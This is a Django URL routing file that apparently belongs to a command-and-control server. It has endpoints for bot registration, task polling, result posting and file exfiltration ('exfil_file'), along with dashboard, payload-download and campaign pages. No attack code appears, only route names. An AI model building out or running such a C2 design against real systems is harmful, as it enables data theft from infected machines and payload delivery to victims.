from django.urls import path
from . import views

urlpatterns = [
    path('register/', views.register_bot),
    path('get_task/', views.get_task),
    path('post_result/', views.post_result),
    path('file_upload/', views.exfil_file),

    # Web UI URLs
    path('', views.c2dashboard, name='c2dashboard'),
    path('bot/<int:bot_id>/', views.c2bot_detail, name='c2bot_detail'),
    path('task/delete/<int:task_id>/', views.c2taskdelete, name='c2taskdelete'),
    path('task/download/<int:bot_id>/<int:task_id>/', views.c2taskdownload, name='c2taskdownload'),
    path('payloads/', views.c2payloads, name='c2payloads'),
    path('payloads/download/<str:fileid>', views.c2payloads_download, name='c2payloadsdownload'),
    path('campaign', views.c2campaign, name='c2campaign'),
    path('campaign/info/<str:uuid>', views.c2campaigninfo, name='c2campaigninfo'),
    path('campaign/creator', views.c2campaigncreator, name='c2campaigncreator'),
    path('<str:campaignuuid>/', views.c2campaignpage, name='c2campaignpage'),
    path('<str:campaignuuid>/<str:clientuuid>', views.c2campaignpageunique, name='c2campaignpageunique'),
    path('file/<str:campaignuuid>/<str:fileid>', views.c2payloads_download_fromcampain, name='c2payloads_download_fromcampain')
]
